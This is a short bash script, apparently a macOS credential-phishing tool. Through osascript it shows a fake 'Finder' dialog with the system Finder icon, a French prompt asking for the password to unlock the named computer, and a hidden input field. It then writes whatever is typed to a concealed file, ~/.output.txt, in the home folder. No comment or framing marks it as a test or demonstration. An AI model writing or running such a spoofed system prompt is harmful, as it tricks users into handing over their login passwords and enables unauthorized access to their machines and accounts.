#!/bin/bash
osascript -e 'set foo to do shell script "/usr/sbin/scutil --get ComputerName"' -e 'set theHD to path to startup disk as text' -e 'set theIconFile to theHD & "System:Library:CoreServices:Dock.app:Contents:Resources:finder.png"' -e 'set dialogAnswer to display dialog "Entrez votre mot de passe pour débloquer " & foo default answer "" with icon file theIconFile with title "Finder" with hidden answer' -e 'set filepath to (path to home folder as text) & ".output.txt"' -e 'set openfile to open for access file filepath with write permission' -e 'write text returned of dialogAnswer to openfile' -e 'close access openfile'
